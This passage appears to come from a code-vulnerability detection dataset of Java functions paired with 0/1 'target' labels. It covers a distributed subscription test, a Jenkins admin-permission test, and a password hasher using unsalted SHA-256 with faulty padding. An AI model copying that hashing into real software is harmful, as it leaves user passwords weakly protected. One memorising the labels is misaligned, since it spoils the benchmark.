= this.host.testCreate(1);\n        ExampleServiceState body = new ExampleServiceState();\n        body.name = UUID.randomUUID().toString();\n        this.host.send(Operation.createPatch(uri).setBody(body).setCompletion((o, e) -> {\n            if (e != null) {\n                updateCtx.fail(e);\n                return;\n            }\n            ExampleServiceState rsp = o.getBody(ExampleServiceState.class);\n            ownerHostId[0] = rsp.documentOwner;\n            updateCtx.complete();\n\n        }));\n        this.host.testWait(updateCtx);\n        this.host.testWait(oneUseNotificationCtx);\n\n        // remove subscription\n        TestContext unSubscribeCtx = this.host.testCreate(1);\n        Operation unSubscribe = subscribe.clone()\n                .setCompletion(unSubscribeCtx.getCompletion())\n                .setAction(Action.DELETE);\n        serviceHost.stopSubscriptionService(unSubscribe,\n                notificationTarget.getUri());\n        this.host.testWait(unSubscribeCtx);\n        this.verifySubscriberCount(new URI[] { uri }, 0);\n\n        VerificationHost ownerHost = null;\n        // find the host that owns the example service and make sure we subscribe from the OTHER\n        // host (since we will stop the current owner)\n        for (VerificationHost h : this.host.getInProcessHostMap().values()) {\n            if (!h.getId().equals(ownerHostId[0])) {\n                serviceHost = h;\n            } else {\n                ownerHost = h;\n            }\n        }\n\n        this.host.log(\"Owner node: %s, subscriber node: %s (%s)\", ownerHostId[0],\n                serviceHost.getId(), serviceHost.getUri());\n\n        AtomicInteger reliableNotificationCount = new AtomicInteger();\n        TestContext subscribeCtxNonOwner = this.host.testCreate(1);\n        // subscribe using non owner host\n        subscribe.setCompletion(subscribeCtxNonOwner.getCompletion());\n        serviceHost.startReliableSubscriptionService(subscribe, (o) -> {\n            reliableNotificationCount.incrementAndGet();\n            o.complete();\n        });\n        localHost.testWait(subscribeCtxNonOwner);\n\n        // send explicit update to example service\n        body.name = UUID.randomUUID().toString();\n        this.host.send(Operation.createPatch(uri).setBody(body));\n\n        while (reliableNotificationCount.get() < 1) {\n            Thread.sleep(100);\n        }\n\n        reliableNotificationCount.set(0);\n\n        this.verifySubscriberCount(new URI[] { uri }, 1);\n\n        // Check reliability: determine what host is owner for the example service we subscribed to.\n        // Then stop that host which should cause the remaining host(s) to pick up ownership.\n        // Subscriptions will not survive on their own, but we expect the ReliableSubscriptionService\n        // to notice the subscription is gone on the new owner, and re subscribe.\n        List<URI> exampleSubUris = new ArrayList<>();\n        for (URI hostUri : this.host.getNodeGroupMap().keySet()) {\n            exampleSubUris.add(UriUtils.buildUri(hostUri, uri.getPath(),\n                    ServiceHost.SERVICE_URI_SUFFIX_SUBSCRIPTIONS));\n        }\n\n        // stop host that has ownership of example service\n        NodeGroupConfig cfg = new NodeGroupConfig();\n        cfg.nodeRemovalDelayMicros = TimeUnit.SECONDS.toMicros(2);\n        this.host.setNodeGroupConfig(cfg);\n\n        // relax quorum\n        this.host.setNodeGroupQuorum(1);\n        // stop host with subscription\n        this.host.stopHost(ownerHost);\n\n        factoryUri = UriUtils.buildUri(serviceHost, ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        uri = UriUtils.buildUri(serviceHost.getUri(), uri.getPath());\n\n        // verify that we still have 1 subscription on the remaining host, which can only happen if the\n        // reliable subscription service notices the current owner failure and re subscribed\n        this.verifySubscriberCount(new URI[] { uri }, 1);\n\n        // and test once again that notifications flow.\n        this.host.log(\"Sending PATCH requests to %s\", uri);\n        long c = this.updateCount;\n        for (int i = 0; i < c; i++) {\n            body.name = \"post-stop-\" + UUID.randomUUID().toString();\n            this.host.send(Operation.createPatch(uri).setBody(body));\n        }\n\n        Date exp = this.host.getTestExpiration();\n        while (reliableNotificationCount.get() < c) {\n            Thread.sleep(250);\n            this.host.log(\"Received %d notifications, expecting %d\",\n                    reliableNotificationCount.get(), c);\n            if (new Date().after(exp)) {\n                throw new TimeoutException();\n            }\n        }\n    }\n\n    @Test\n    public void subscriptionsToFactoryAndChildren() throws Throwable {\n        this.host.stop();\n        this.host.setPort(0);\n        this.host.start();\n        this.host.setPublicUri(UriUtils.buildUri(\"localhost\", this.host.getPort(), \"\", null));\n        this.host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n\n        URI factoryUri = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n\n        String prefix = \"example-\";\n        Long counterValue = Long.MAX_VALUE;\n        URI[] childUris = new URI[this.serviceCount];\n\n        doFactoryPostNotifications(factoryUri, this.serviceCount, prefix, counterValue, childUris);\n\n        doNotificationsWithReplayState(childUris);\n\n        doNotificationsWithFailure(childUris);\n\n        doNotificationsWithLimitAndPublicUri(childUris);\n\n        doNotificationsWithExpiration(childUris);\n\n        doDeleteNotifications(childUris, counterValue);\n    }\n\n    @Test\n    public void subscriptionsWithAuth() throws Throwable {\n        VerificationHost hostWithAuth = null;\n        try {\n            String testUserEmail = \"foo@vmware.com\";\n            hostWithAuth = VerificationHost.create(0);\n            hostWithAuth.setAuthorizationEnabled(true);\n            hostWithAuth.start();\n            hostWithAuth.setSystemAuthorizationContext();\n            TestContext waitContext = hostWithAuth.testCreate(1);\n            AuthorizationSetupHelper.create()\n                    .setHost(hostWithAuth)\n                    .setDocumentKind(Utils.buildKind(MinimalTestServiceState.class))\n                    .setUserEmail(testUserEmail)\n                    .setUserSelfLink(testUserEmail)\n                    .setUserPassword(testUserEmail)\n                    .setCompletion(waitContext.getCompletion())\n                    .start();\n            hostWithAuth.testWait(waitContext);\n            hostWithAuth.resetSystemAuthorizationContext();\n            hostWithAuth.assumeIdentity(UriUtils.buildUriPath(ServiceUriPaths.CORE_AUTHZ_USERS, testUserEmail));\n            MinimalTestService s = new MinimalTestService();\n            MinimalTestServiceState serviceState = new MinimalTestServiceState();\n            serviceState.id = UUID.randomUUID().toString();\n            String minimalServiceUUID = UUID.randomUUID().toString();\n            TestContext notifyContext = hostWithAuth.testCreate(1);\n            hostWithAuth.startServiceAndWait(s, minimalServiceUUID, serviceState);\n\n            Consumer<Operation> notifyC = (nOp) -> {\n                nOp.complete();\n                switch (nOp.getAction()) {\n                case PUT:\n                    notifyContext.completeIteration();\n                    break;\n                default:\n                    break;\n\n                }\n            };\n            Operation subscribe = Operation.createPost(UriUtils.buildUri(hostWithAuth, minimalServiceUUID));\n            subscribe.setReferer(hostWithAuth.getReferer());\n            ServiceSubscriber subscriber = new ServiceSubscriber();\n            subscriber.replayState = true;\n            hostWithAuth.startSubscriptionService(subscribe, notifyC, subscriber);\n            hostWithAuth.testWait(notifyContext);\n        } finally {\n            if (hostWithAuth != null) {\n                hostWithAuth.tearDown();\n            }\n        }\n    }\n\n    @Test\n    public void testSubscriptionsWithExpiry() throws Throwable {\n        MinimalTestService s = new MinimalTestService();\n        MinimalTestServiceState serviceState = new MinimalTestServiceState();\n        serviceState.id = UUID.randomUUID().toString();\n        String minimalServiceUUID = UUID.randomUUID().toString();\n        TestContext notifyContext = this.host.testCreate(1);\n        TestContext notifyDeleteContext = this.host.testCreate(1);\n        this.host.startServiceAndWait(s, minimalServiceUUID, serviceState);\n\n        Service notificationTarget = new StatelessService() {\n            @Override\n            public void authorizeRequest(Operation op) {\n                op.complete();\n                return;\n            }\n\n            @Override\n            public void handleRequest(Operation op) {\n                if (!op.isNotification()) {\n                    if (op.getAction() == Action.DELETE && op.getUri().equals(getUri())) {\n                        notifyDeleteContext.completeIteration();\n                    }\n                    super.handleRequest(op);\n                    return;\n                }\n                if (op.getAction() == Action.PUT) {\n                    notifyContext.completeIteration();\n                }\n            }\n        };\n        Operation subscribe = Operation.createPost(UriUtils.buildUri(host, minimalServiceUUID));\n        subscribe.setReferer(host.getReferer());\n        ServiceSubscriber subscriber = new ServiceSubscriber();\n        subscriber.replayState = true;\n        // Set a 500ms expiry\n        subscriber.documentExpirationTimeMicros = Utils\n                .fromNowMicrosUtc(TimeUnit.MILLISECONDS.toMicros(500));\n        host.startSubscriptionService(subscribe, notificationTarget, subscriber);\n        host.testWait(notifyContext);\n        host.testWait(notifyDeleteContext);\n    }\n\n    @Test\n    public void subscribeAndWaitForServiceAvailability() throws Throwable {\n        // until HTTP2 support is we must only subscribe to less than max connections!\n        // otherwise we deadlock: the connection for the queued subscribe is used up,\n        // no more connections can be created, to that owner.\n        this.serviceCount = NettyHttpServiceClient.DEFAULT_CONNECTIONS_PER_HOST / 2;\n        setUpPeers();\n\n        this.host.waitForReplicatedFactoryServiceAvailable(\n                this.host.getPeerServiceUri(ExampleService.FACTORY_LINK));\n\n        // Pick one host to post to\n        VerificationHost serviceHost = this.host.getPeerHost();\n\n        // Create example service states to subscribe to\n        List<ExampleServiceState> states = new ArrayList<>();\n        for (int i = 0; i < this.serviceCount; i++) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.documentSelfLink = UriUtils.buildUriPath(\n                    ExampleService.FACTORY_LINK,\n                    UUID.randomUUID().toString());\n            state.name = UUID.randomUUID().toString();\n            states.add(state);\n        }\n\n        AtomicInteger notifications = new AtomicInteger();\n        // Subscription target\n        ServiceSubscriber sr = createAndStartNotificationTarget((update) -> {\n            if (update.getAction() != Action.PATCH) {\n                // because we start multiple nodes and we do not wait for factory start\n                // we will receive synchronization related PUT requests, on each service.\n                // Ignore everything but the PATCH we send from the test\n                return false;\n            }\n            this.host.completeIteration();\n            this.host.log(\"notification %d\", notifications.incrementAndGet());\n            update.complete();\n            return true;\n        });\n\n        this.host.log(\"Subscribing to %d services\", this.serviceCount);\n        // Subscribe to factory (will not complete until factory is started again)\n        for (ExampleServiceState state : states) {\n            URI uri = UriUtils.buildUri(serviceHost, state.documentSelfLink);\n            subscribeToService(uri, sr);\n        }\n\n        // First the subscription requests will be sent and will be queued.\n        // So N completions come from the subscribe requests.\n        // After that, the services will be POSTed and started. This is the second set\n        // of N completions.\n        this.host.testStart(2 * this.serviceCount);\n        this.host.log(\"Sending parallel POST for %d services\", this.serviceCount);\n\n        AtomicInteger postCount = new AtomicInteger();\n        // Create example services, triggering subscriptions to complete\n        for (ExampleServiceState state : states) {\n            URI uri = UriUtils.buildFactoryUri(serviceHost, ExampleService.class);\n            Operation op = Operation.createPost(uri)\n                    .setBody(state)\n                    .setCompletion((o, e) -> {\n                        if (e != null) {\n                            this.host.failIteration(e);\n                            return;\n                        }\n                        this.host.log(\"POST count %d\", postCount.incrementAndGet());\n                        this.host.completeIteration();\n                    });\n            this.host.send(op);\n        }\n\n        this.host.testWait();\n\n        this.host.testStart(2 * this.serviceCount);\n        // now send N PATCH ops so we get notifications\n        for (ExampleServiceState state : states) {\n            // send a PATCH, to trigger notification\n            URI u = UriUtils.buildUri(serviceHost, state.documentSelfLink);\n            state.counter = Utils.getNowMicrosUtc();\n            Operation patch = Operation.createPatch(u)\n                    .setBody(state)\n                    .setCompletion(this.host.getCompletion());\n            this.host.send(patch);\n        }\n        this.host.testWait();\n    }\n\n    private void doFactoryPostNotifications(URI factoryUri, int childCount, String prefix,\n            Long counterValue,\n            URI[] childUris) throws Throwable {\n        this.host.log(\"starting subscription to factory\");\n        this.host.testStart(1);\n        // let the service host update the URI from the factory to its subscriptions\n        Operation subscribeOp = Operation.createPost(factoryUri)\n                .setReferer(this.host.getReferer())\n                .setCompletion(this.host.getCompletion());\n        URI notificationTarget = host.startSubscriptionService(subscribeOp, (o) -> {\n            if (o.getAction() == Action.POST) {\n                this.host.completeIteration();\n            } else {\n                this.host.failIteration(new IllegalStateException(\"Unexpected notification: \"\n                        + o.toString()));\n            }\n        });\n        this.host.testWait();\n\n        // expect a POST notification per child, a POST completion per child\n        this.host.testStart(childCount * 2);\n        for (int i = 0; i < childCount; i++) {\n            ExampleServiceState initialState = new ExampleServiceState();\n            initialState.name = initialState.documentSelfLink = prefix + i;\n            initialState.counter = counterValue;\n            final int finalI = i;\n\n            // create an example service\n            this.host.send(Operation\n                    .createPost(factoryUri)\n                    .setBody(initialState).setCompletion((o, e) -> {\n                        if (e != null) {\n                            this.host.failIteration(e);\n                            return;\n                        }\n                        ServiceDocument rsp = o.getBody(ServiceDocument.class);\n                        childUris[finalI] = UriUtils.buildUri(this.host, rsp.documentSelfLink);\n                        this.host.completeIteration();\n                    }));\n        }\n        this.host.testWait();\n\n        this.host.testStart(1);\n        Operation delete = subscribeOp.clone().setUri(factoryUri).setAction(Action.DELETE);\n        this.host.stopSubscriptionService(delete, notificationTarget);\n        this.host.testWait();\n        this.verifySubscriberCount(new URI[]{factoryUri}, 0);\n    }\n\n    private void doNotificationsWithReplayState(URI[] childUris)\n            throws Throwable {\n        this.host.log(\"starting subscription with replay\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(\n                UUID.randomUUID().toString(),\n                deletesRemainingCount);\n        sr.replayState = true;\n        // Subscribe to notifications from every example service; get notified with current state\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n\n        patchChildren(childUris, false);\n\n        patchChildren(childUris, false);\n\n        // Finally un subscribe the notification handlers\n        unsubscribeFromChildren(childUris, sr.reference, false);\n        verifySubscriberCount(childUris, 0);\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void doNotificationsWithExpiration(URI[] childUris)\n            throws Throwable {\n        this.host.log(\"starting subscription with expiration\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n\n        // start a notification target that will not complete test iterations since expirations race\n        // with notifications, allowing for notifications to be processed after the next test starts\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount, false, false);\n        sr.documentExpirationTimeMicros = Utils.fromNowMicrosUtc(\n                this.host.getMaintenanceIntervalMicros() * 2);\n        // Subscribe to notifications from every example service; get notified with current state\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n\n        Thread.sleep((this.host.getMaintenanceIntervalMicros() / 1000) * 2);\n        // do a patch which will cause the publisher to evaluate and expire subscriptions\n        patchChildren(childUris, true);\n\n        verifySubscriberCount(childUris, 0);\n\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void deleteNotificationTarget(AtomicInteger deletesRemainingCount,\n            ServiceSubscriber sr) throws Throwable {\n        deletesRemainingCount.set(1);\n        TestContext ctx = testCreate(1);\n        this.host.send(Operation.createDelete(sr.reference)\n                .setCompletion((o, e) -> ctx.completeIteration()));\n        testWait(ctx);\n    }\n\n    private void doNotificationsWithFailure(URI[] childUris) throws Throwable, InterruptedException {\n        this.host.log(\"starting subscription with failure, stopping notification target\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        // Re subscribe, but stop the notification target, causing automatic removal of the\n        // subscriptions\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n        deleteNotificationTarget(deletesRemainingCount, sr);\n\n        // send updates and expect failure in delivering notifications\n        patchChildren(childUris, true);\n        // expect the publisher to note at least one failed notification attempt\n        verifySubscriberCount(true, childUris, 1, 1L);\n\n        // restart notification target service but expect a pragma in the notifications\n        // saying we missed some\n        boolean expectSkippedNotificationsPragma = true;\n        this.host.log(\"restarting notification target\");\n        createAndStartNotificationTarget(sr.reference.getPath(),\n                deletesRemainingCount, expectSkippedNotificationsPragma, true);\n\n        // send some more updates, this time expect ZERO failures;\n        patchChildren(childUris, false);\n        verifySubscriberCount(true, childUris, 1, 0L);\n\n        this.host.log(\"stopping notification target, again\");\n        deleteNotificationTarget(deletesRemainingCount, sr);\n\n        while (!verifySubscriberCount(false, childUris, 0, null)) {\n            Thread.sleep(VerificationHost.FAST_MAINT_INTERVAL_MILLIS);\n            patchChildren(childUris, true);\n        }\n\n        this.host.log(\"Verifying all subscriptions have been removed\");\n        // because we sent more than K updates, causing K + 1 notification delivery failures,\n        // the subscriptions should all be automatically removed!\n        verifySubscriberCount(childUris, 0);\n    }\n\n    private void doNotificationsWithLimitAndPublicUri(URI[] childUris) throws Throwable,\n            InterruptedException, TimeoutException {\n        this.host.log(\"starting subscription with limit and public uri\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        // Re subscribe, use public URI and limit notifications to one.\n        // After these notifications are sent, we should see all subscriptions removed\n        deletesRemainingCount.set(childUris.length + 1);\n        sr.usePublicUri = true;\n        sr.notificationLimit = this.updateCount;\n\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n        // Issue another patch request on every example service instance\n        patchChildren(childUris, false);\n\n        // because we set notificationLimit, all subscriptions should be removed\n        verifySubscriberCount(childUris, 0);\n\n        Date exp = this.host.getTestExpiration();\n        // verify we received DELETEs on the notification target when a subscription was removed\n        while (deletesRemainingCount.get() != 1) {\n            Thread.sleep(250);\n            if (new Date().after(exp)) {\n                throw new TimeoutException(\"DELETEs not received at notification target:\"\n                        + deletesRemainingCount.get());\n            }\n        }\n\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void doDeleteNotifications(URI[] childUris, Long counterValue) throws Throwable {\n        this.host.log(\"starting subscription for DELETEs\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        subscribeToServices(childUris, sr);\n\n        // Issue DELETEs and verify the subscription was notified\n        this.host.testStart(childUris.length * 2);\n        for (URI child : childUris) {\n            ExampleServiceState initialState = new ExampleServiceState();\n            initialState.counter = counterValue;\n            Operation delete = Operation\n                    .createDelete(child)\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.send(delete);\n        }\n        this.host.testWait();\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(String link,\n            final AtomicInteger deletesRemainingCount) throws Throwable {\n        return createAndStartNotificationTarget(link, deletesRemainingCount, false, true);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(String link,\n            final AtomicInteger deletesRemainingCount,\n            boolean expectSkipNotificationsPragma,\n            boolean completeIterations) throws Throwable {\n        final AtomicBoolean seenSkippedNotificationPragma =\n                new AtomicBoolean(false);\n\n        return createAndStartNotificationTarget(link, (update) -> {\n            if (!update.isNotification()) {\n                if (update.getAction() == Action.DELETE) {\n                    int r = deletesRemainingCount.decrementAndGet();\n                    if (r != 0) {\n                        update.complete();\n                        return true;\n                    }\n                }\n                return false;\n            }\n\n            if (update.getAction() != Action.PATCH &&\n                    update.getAction() != Action.PUT &&\n                    update.getAction() != Action.DELETE) {\n                update.complete();\n                return true;\n            }\n\n            if (expectSkipNotificationsPragma) {\n                String pragma = update.getRequestHeader(Operation.PRAGMA_HEADER);\n                if (!seenSkippedNotificationPragma.get() && (pragma == null\n                        || !pragma.contains(Operation.PRAGMA_DIRECTIVE_SKIPPED_NOTIFICATIONS))) {\n                    this.host.failIteration(new IllegalStateException(\n                            \"Missing skipped notification pragma\"));\n                    return true;\n                } else {\n                    seenSkippedNotificationPragma.set(true);\n                }\n            }\n\n            if (completeIterations) {\n                this.host.completeIteration();\n            }\n\n            update.complete();\n            return true;\n        });\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(\n            Function<Operation, Boolean> h) throws Throwable {\n        return createAndStartNotificationTarget(UUID.randomUUID().toString(), h);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(\n            String link,\n            Function<Operation, Boolean> h) throws Throwable {\n        StatelessService notificationTarget = createNotificationTargetService(h);\n\n        // Start notification target (shared between subscriptions)\n        Operation startOp = Operation\n                .createPost(UriUtils.buildUri(this.host, link))\n                .setCompletion(this.host.getCompletion())\n                .setReferer(this.host.getReferer());\n        this.host.testStart(1);\n        this.host.startService(startOp, notificationTarget);\n        this.host.testWait();\n\n        ServiceSubscriber sr = new ServiceSubscriber();\n        sr.reference = notificationTarget.getUri();\n        return sr;\n    }\n\n    private StatelessService createNotificationTargetService(Function<Operation, Boolean> h) {\n        return new StatelessService() {\n            @Override\n            public void handleRequest(Operation update) {\n                if (!h.apply(update)) {\n                    super.handleRequest(update);\n                }\n            }\n        };\n    }\n\n    private void subscribeToServices(URI[] uris, ServiceSubscriber sr) throws Throwable {\n        int expectedCompletions = uris.length;\n        if (sr.replayState) {\n            expectedCompletions *= 2;\n        }\n        subscribeToServices(uris, sr, expectedCompletions);\n    }\n\n    private void subscribeToServices(URI[] uris, ServiceSubscriber sr, int expectedCompletions) throws Throwable {\n        this.host.testStart(expectedCompletions);\n        for (int i = 0; i < uris.length; i++) {\n            subscribeToService(uris[i], sr);\n        }\n        this.host.testWait();\n    }\n\n    private void subscribeToService(URI uri, ServiceSubscriber sr) {\n        if (sr.usePublicUri) {\n            sr = Utils.clone(sr);\n            sr.reference = UriUtils.buildPublicUri(this.host, sr.reference.getPath());\n        }\n\n        URI subUri = UriUtils.buildSubscriptionUri(uri);\n        this.host.send(Operation.createPost(subUri)\n                .setCompletion(this.host.getCompletion())\n                .setReferer(this.host.getReferer())\n                .setBody(sr)\n                .addPragmaDirective(Operation.PRAGMA_DIRECTIVE_QUEUE_FOR_SERVICE_AVAILABILITY));\n    }\n\n    private void unsubscribeFromChildren(URI[] uris, URI targetUri,\n            boolean useServiceHostStopSubscription) throws Throwable {\n        int count = uris.length;\n        TestContext ctx = testCreate(count);\n        for (int i = 0; i < count; i++) {\n            if (useServiceHostStopSubscription) {\n                // stop the subscriptions using the service host API\n                host.stopSubscriptionService(\n                        Operation.createDelete(uris[i])\n                                .setCompletion(ctx.getCompletion()),\n                        targetUri);\n                continue;\n            }\n            ServiceSubscriber unsubscribeBody = new ServiceSubscriber();\n            unsubscribeBody.reference = targetUri;\n\n            URI subUri = UriUtils.buildSubscriptionUri(uris[i]);\n            this.host.send(Operation.createDelete(subUri)\n                    .setCompletion(ctx.getCompletion())\n                    .setBody(unsubscribeBody));\n        }\n        testWait(ctx);\n    }\n\n    private boolean verifySubscriberCount(URI[] uris, int subscriberCount) throws Throwable {\n        return verifySubscriberCount(true, uris, subscriberCount, null);\n    }\n\n    private boolean verifySubscriberCount(boolean wait, URI[] uris, int subscriberCount,\n            Long failedNotificationCount)\n            throws Throwable {\n        URI[] subUris = new URI[uris.length];\n        int i = 0;\n        for (URI u : uris) {\n            URI subUri = UriUtils.buildSubscriptionUri(u);\n            subUris[i++] = subUri;\n        }\n\n        AtomicBoolean isConverged = new AtomicBoolean();\n        this.host.waitFor(\"subscriber verification timed out\", () -> {\n            isConverged.set(true);\n            Map<URI, ServiceSubscriptionState> subStates = new ConcurrentSkipListMap<>();\n            TestContext ctx = this.host.testCreate(uris.length);\n            for (URI u : subUris) {\n                this.host.send(Operation.createGet(u).setCompletion((o, e) -> {\n                    ServiceSubscriptionState s = null;\n                    if (e == null) {\n                        s = o.getBody(ServiceSubscriptionState.class);\n                    } else {\n                        this.host.log(\"error response from %s: %s\", o.getUri(), e.getMessage());\n                        // because we stopped an owner node, if gossip is not updated a GET\n                        // to subscriptions might fail because it was forward to a stale node\n                        s = new ServiceSubscriptionState();\n                        s.subscribers = new HashMap<>();\n                    }\n                    subStates.put(o.getUri(), s);\n                    ctx.complete();\n                }));\n            }\n            ctx.await();\n\n            for (ServiceSubscriptionState state : subStates.values()) {\n                int expected = subscriberCount;\n                int actual = state.subscribers.size();\n                if (actual != expected) {\n                    isConverged.set(false);\n                    break;\n                }\n\n                if (failedNotificationCount == null) {\n                    continue;\n                }\n\n                for (ServiceSubscriber sr : state.subscribers.values()) {\n                    if (sr.failedNotificationCount == null && failedNotificationCount == 0) {\n                        continue;\n                    }\n                    if (sr.failedNotificationCount == null\n                            || 0 != sr.failedNotificationCount.compareTo(failedNotificationCount)) {\n                        isConverged.set(false);\n                        break;\n                    }\n                }\n\n            }\n            if (isConverged.get() || !wait) {\n                return true;\n            }\n\n            return false;\n        });\n\n        return isConverged.get();\n    }\n\n    private void patchChildren(URI[] uris, boolean expectFailure) throws Throwable {\n        int count = expectFailure ? uris.length : uris.length * 2;\n        long c = this.updateCount;\n        if (!expectFailure) {\n            count *= this.updateCount;\n        } else {\n            c = 1;\n        }\n\n        this.host.testStart(count);\n        for (int i = 0; i < uris.length; i++) {\n            for (int k = 0; k < c; k++) {\n                ExampleServiceState initialState = new ExampleServiceState();\n                initialState.counter = Long.MAX_VALUE;\n                Operation patch = Operation\n                        .createPatch(uris[i])\n                        .setBody(initialState)\n                        .setCompletion(this.host.getCompletion());\n                this.host.send(patch);\n            }\n        }\n        this.host.testWait();\n    }\n}\n", "target": 1}
{"idx": 1042, "func": "package hudson.diagnosis;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\n\nimport com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;\nimport com.gargoylesoftware.htmlunit.HttpMethod;\nimport com.gargoylesoftware.htmlunit.WebRequest;\nimport com.gargoylesoftware.htmlunit.util.NameValuePair;\nimport hudson.model.User;\nimport hudson.security.GlobalMatrixAuthorizationStrategy;\nimport hudson.security.HudsonPrivateSecurityRealm;\nimport hudson.security.Permission;\nimport jenkins.model.Jenkins;\nimport org.acegisecurity.context.SecurityContextHolder;\nimport org.junit.Rule;\nimport org.junit.Test;\nimport org.jvnet.hudson.test.Issue;\nimport org.jvnet.hudson.test.JenkinsRule;\nimport org.xml.sax.SAXException;\nimport com.gargoylesoftware.htmlunit.html.HtmlPage;\nimport com.gargoylesoftware.htmlunit.html.HtmlForm;\nimport com.gargoylesoftware.htmlunit.ElementNotFoundException;\n\nimport java.io.IOException;\nimport java.util.Collections;\n\n/**\n * @author Kohsuke Kawaguchi\n */\npublic class HudsonHomeDiskUsageMonitorTest {\n\n    @Rule\n    public JenkinsRule j = new JenkinsRule();\n\n    @Test\n    public void flow() throws Exception {\n        // manually activate this\n        HudsonHomeDiskUsageMonitor mon = HudsonHomeDiskUsageMonitor.get();\n        mon.activated = true;\n\n        // clicking yes should take us to somewhere\n        j.submit(getForm(mon), \"yes\");\n        assertTrue(mon.isEnabled());\n\n        // now dismiss\n        // submit(getForm(mon),\"no\"); TODO: figure out why this test is fragile\n        mon.doAct(\"no\");\n        assertFalse(mon.isEnabled());\n\n        // and make sure it's gone\n        try {\n            fail(getForm(mon)+\" shouldn't be there\");\n        } catch (ElementNotFoundException e) {\n            // as expected\n        }\n    }\n\n    @Issue(\"SECURITY-371\")\n    @Test\n    public void noAccessForNonAdmin() throws Exception {\n        JenkinsRule.WebClient wc = j.createWebClient();\n\n        // TODO: Use MockAuthorizationStrategy in later versions\n        JenkinsRule.DummySecurityRealm realm = j.createDummySecurityRealm();\n        realm.addGroups(\"administrator\", \"admins\");\n        realm.addGroups(\"bob\", \"users\");\n        j.jenkins.setSecurityRealm(realm);\n        GlobalMatrixAuthorizationStrategy auth = new GlobalMatrixAuthorizationStrategy();\n        auth.add(Jenkins.ADMINISTER, \"admins\");\n        auth.add(Jenkins.READ, \"users\");\n        j.jenkins.setAuthorizationStrategy(auth);\n\n        WebRequest request = new WebRequest(wc.createCrumbedUrl(\"administrativeMonitor/hudsonHomeIsFull/act\"), HttpMethod.POST);\n        NameValuePair param = new NameValuePair(\"no\", \"true\");\n        request.setRequestParameters(Collections.singletonList(param));\n\n        HudsonHomeDiskUsageMonitor mon = HudsonHomeDiskUsageMonitor.get();\n\n        try {\n            wc.login(\"bob\");\n            wc.getPage(request);\n        } catch (FailingHttpStatusCodeException e) {\n            assertEquals(403, e.getStatusCode());\n        }\n        assertTrue(mon.isEnabled());\n\n        try {\n            WebRequest getIndex = new WebRequest(wc.createCrumbedUrl(\"administrativeMonitor/hudsonHomeIsFull\"), HttpMethod.GET);\n            wc.getPage(getIndex);\n        } catch (FailingHttpStatusCodeException e) {\n            assertEquals(403, e.getStatusCode());\n        }\n\n        wc.login(\"administrator\");\n        wc.getPage(request);\n        assertFalse(mon.isEnabled());\n\n    }\n\n    /**\n     * Gets the warning form.\n     */\n    private HtmlForm getForm(HudsonHomeDiskUsageMonitor mon) throws IOException, SAXException {\n        HtmlPage p = j.createWebClient().goTo(\"manage\");\n        return p.getFormByName(mon.id);\n    }\n}\n", "target": 0}
{"idx": 1043, "func": "package com.bijay.onlinevotingsystem.controller;\n\nimport java.math.BigInteger;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class SHA256 {\n\n\tpublic String getSHA(String password) {\n\n\t\ttry {\n\t\t\t// Static getInstance method is called with hashing SHA\n\t\t\tMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n\n\t\t\t// digest() method called\n\t\t\t// to calculate message digest of an input\n\t\t\t// and return array of byte\n\t\t\tbyte[] messageDigest = md.digest(password.getBytes());\n\n\t\t\t// Convert byte array into signum representation\n\t\t\tBigInteger no = new BigInteger(1, messageDigest);\n\n\t\t\t// Convert message digest into hex value\n\t\t\tString hashPass = no.toString(16);\n\n\t\t\twhile (hashPass.length() < 32) {\n\t\t\t\thashPass = \"0\" + hashPass;\n\t\t\t}\n\t\t\treturn hashPass;\n\n\t\t\t// For specifying wrong message digest algorithms\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\te.printStackTrace();\n\t\t\treturn null;\n\t\t}\n\t}\n}\n", "target": 1}
